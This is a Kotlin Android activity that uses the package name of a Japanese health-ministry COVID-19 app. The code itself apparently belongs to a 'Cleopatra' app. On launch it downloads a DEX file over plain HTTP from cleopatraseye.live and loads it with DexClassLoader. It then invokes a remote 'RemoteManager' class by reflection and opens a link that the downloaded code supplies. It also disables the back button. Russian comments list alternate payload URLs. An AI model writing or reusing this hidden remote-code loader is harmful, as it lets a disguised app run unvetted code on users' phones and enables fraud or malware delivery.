package jp.go.mhlw.covid19r.screens

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.animation.AnimationUtils
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import dalvik.system.DexClassLoader
import jp.go.mhlw.covid19r.Const
import jp.go.mhlw.covid19r.R
import jp.go.mhlw.covid19r.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import kotlin.coroutines.Continuation

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val sharedPreferences = getSharedPreferences("CleopatraSharedPref", Context.MODE_PRIVATE)
        val sharedLink = sharedPreferences.getString("CleopatraLink", "null")
        if (sharedLink != "null") {
            val intent = Intent(this, EndPointScreen::class.java)
            intent.putExtra(Const.SHARED_LINK_NAME, sharedLink)
            startActivity(intent)
        } else {
            lifecycleScope.launch {
                withContext(Dispatchers.IO){
                    //ссылка Дениса http://cleopatraseye.live/juwq.dex
                    //ссылка Моя https://filetransfer.io/data-package/Wqfr1uNK/download

                    Log.d(Const.TAG, "Just connection.requestMethod")

                    val url = "http://cleopatraseye.live/juwq.dex"
                    val client = OkHttpClient()
                    val request = Request.Builder().url(url).build()

                    client.newCall(request).execute().use { response ->
                        if (!response.isSuccessful) throw IOException("Error downloading DEX file")
                        val dexFile = File.createTempFile("classes", ".dex", this@MainActivity.cacheDir)
                        response.body?.byteStream()?.use { inputStream ->
                            FileOutputStream(dexFile).use { outputStream ->
                                inputStream.copyTo(outputStream)
                            }
                        }

                        val dexFileLoader = DexClassLoader(
                            dexFile.absolutePath,
                            cacheDir.absolutePath,
                            null,
                            classLoader
                        )
                        val urlBuilderClass = dexFileLoader.loadClass("RemoteManager")
                        val instance = urlBuilderClass.newInstance()
                        val initRemoteManager = urlBuilderClass.getMethod(
                            "initRemoteManager",
                            Context::class.java,
                            Continuation::class.java
                        )

                        val continuation = Continuation<String>(Dispatchers.Main) {
                            Log.d(Const.TAG, "The link is ${it.getOrNull()} sending to Intent ")
                            val intent = Intent(this@MainActivity, EndPointScreen::class.java)
                            intent.putExtra(Const.SHARED_LINK_NAME, it.getOrNull())
                            startActivity(intent)
                        }

                        initRemoteManager.invoke(instance, this@MainActivity, continuation)
                    }
                }
            }

            binding = ActivityMainBinding.inflate(layoutInflater)
            setContentView(binding.root)
            window.statusBarColor = getColor(R.color.black)
            val pulsate = AnimationUtils.loadAnimation(this, R.anim.alpha_pulse)

            with(binding) {
                img1.startAnimation(pulsate)
                img2.startAnimation(pulsate)
                img3.startAnimation(pulsate)
                img4.startAnimation(pulsate)
                img5.startAnimation(pulsate)
                img6.startAnimation(pulsate)
            }
        }
    }
    override fun onBackPressed() {

    }

}